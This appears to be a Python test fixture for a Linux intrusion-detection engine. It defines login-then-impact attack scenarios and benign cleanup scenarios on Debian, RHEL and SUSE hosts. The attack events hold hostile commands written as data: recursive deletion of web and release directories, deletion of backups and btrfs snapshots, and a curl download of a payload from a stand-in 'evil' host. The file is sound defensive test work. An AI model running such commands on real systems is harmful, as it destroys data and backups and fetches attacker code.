import sys
import time
from pathlib import Path
from typing import List

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.normalize import NormalizedEvent

from tests.coverage.credential_access_helper import CoverageScenario


def _auth_evt(ts, *, action="ssh_login", user="root", host="impact-host", source="auth.log", distro_family="unknown"):
    return NormalizedEvent(
        ts=ts,
        host=host,
        src_ip="203.0.113.10",
        source=source,
        category="auth",
        action=action,
        outcome="success",
        user=user,
        message=f"{action}:success",
        fields={},
        distro_family=distro_family,
    )


def _proc_evt(ts, cmdline, *, host="impact-host", user="root", process=None, source="journald", distro_family="unknown"):
    return NormalizedEvent(
        ts=ts,
        host=host,
        source=source,
        category="process",
        action="process_exec",
        outcome="success",
        user=user,
        process=process or cmdline.split()[0],
        message=cmdline,
        fields={"cmdline": cmdline},
        distro_family=distro_family,
    )


def build_attack_scenarios() -> List[CoverageScenario]:
    now = time.time()
    return [
        CoverageScenario(
            name="debian-login-then-rm-rf",
            events=[
                _auth_evt(now + 1, action="ssh_login", host="impact-attack-01", distro_family="debian"),
                _proc_evt(now + 11, "rm -rf /srv/app/releases /var/www/html", host="impact-attack-01", process="rm", distro_family="debian"),
            ],
            expected_ids={"PROC-IMP-001", "SEQ-065"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="rhel-downloader-then-find-delete",
            events=[
                _auth_evt(now + 2, action="identity_login", host="impact-attack-02", distro_family="rhel"),
                _proc_evt(now + 7, "curl -fsSL http://evil/payload.sh -o /tmp/payload.sh", host="impact-attack-02", process="curl", source="auditd", distro_family="rhel"),
                _proc_evt(now + 12, "find /var/backups /srv/backup -type f -delete", host="impact-attack-02", process="find", source="auditd", distro_family="rhel"),
            ],
            expected_ids={"PROC-IMP-001", "SEQ-066"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="suse-btrfs-snapshots-delete",
            events=[
                _auth_evt(now + 3, action="vpn_login", host="impact-attack-03", distro_family="suse"),
                _proc_evt(now + 13, "btrfs subvolume delete /.snapshots/42/snapshot", host="impact-attack-03", process="btrfs", source="syslog", distro_family="suse"),
            ],
            expected_ids={"PROC-IMP-001", "SEQ-065"},
            forbidden_ids=set(),
            kind="attack",
        ),
    ]


def build_benign_scenarios() -> List[CoverageScenario]:
    now = time.time()
    return [
        CoverageScenario(
            name="debian-package-cleanup",
            events=[
                _auth_evt(now + 101, action="ssh_login", host="impact-benign-01", distro_family="debian"),
                _proc_evt(now + 111, "apt-get autoremove -y && apt-get clean", host="impact-benign-01", process="apt-get", distro_family="debian"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-IMP-001", "PROC-IMP-002", "SEQ-065", "SEQ-066"},
            kind="benign",
        ),
        CoverageScenario(
            name="rhel-cache-cleanup",
            events=[
                _auth_evt(now + 102, action="identity_login", host="impact-benign-02", distro_family="rhel"),
                _proc_evt(now + 112, "dnf clean all && journalctl --vacuum-time=7d", host="impact-benign-02", process="dnf", source="auditd", distro_family="rhel"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-IMP-001", "PROC-IMP-002", "SEQ-065", "SEQ-066"},
            kind="benign",
        ),
        CoverageScenario(
            name="suse-snapper-cleanup",
            events=[
                _auth_evt(now + 103, action="vpn_login", host="impact-benign-03", distro_family="suse"),
                _proc_evt(now + 113, "snapper cleanup number && transactional-update cleanup", host="impact-benign-03", process="snapper", source="syslog", distro_family="suse"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-IMP-001", "PROC-IMP-002", "SEQ-065", "SEQ-066"},
            kind="benign",
        ),
    ]
